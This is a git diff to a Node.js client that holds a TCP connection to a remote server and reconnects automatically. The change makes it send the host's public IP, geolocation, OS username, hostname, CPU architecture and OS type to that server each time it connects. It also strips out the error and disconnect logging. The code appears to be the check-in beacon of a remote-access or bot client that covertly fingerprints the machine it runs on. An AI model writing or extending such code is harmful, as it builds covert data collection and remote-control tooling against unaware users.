@@ -1,6 +1,8 @@
 import { config } from 'dotenv'
 import { connect, type Socket } from 'node:net'
 import path from 'node:path'
+import os from 'node:os'
+import { Ip } from './models/Ip'
 
 const { publicIpv4 } = require('fix-esm').require('public-ip')
 
@@ -21,29 +23,42 @@ function connectSocket (): void {
     })
   }
 
-  socket.on('error', (err) => {
+  socket.on('error', () => {
     isConnected = false
-
-    console.error(`Error in connection: ${err.message}`)
-    setTimeout(connectSocket, 1000)
+    setTimeout(connectSocket, 5000)
   })
 
   socket.on('close', () => {
     isConnected = false
-    console.log('Socket closed')
-    setTimeout(connectSocket, 1000)
+    setTimeout(connectSocket, 5000)
   })
 
-  socket.on('ready', async () => {
-    isConnected = true
+  socket.on('connect', async () => {
+    if (!isConnected) {
+      const ip: string = await publicIpv4()
+      const ipModel = new Ip(ip)
 
-    const ip: string = await publicIpv4()
+      await ipModel.query()
 
-    console.log(ip)
+      const data = {
+        ip,
+        username: os.userInfo().username,
+        hostname: os.hostname(),
+        country: ipModel.country,
+        lat: ipModel.lat,
+        lon: ipModel.lon,
+        regionName: ipModel.regionName,
+        cpu: os.arch(),
+        os: os.type()
+      }
 
-    socket.write(Buffer.from(ip))
+      console.log(data)
 
-    console.log('Server connected!')
+      socket.write(Buffer.from(JSON.stringify(data)))
+
+      console.log('Server connected!')
+      isConnected = true
+    }
   })
 }
 
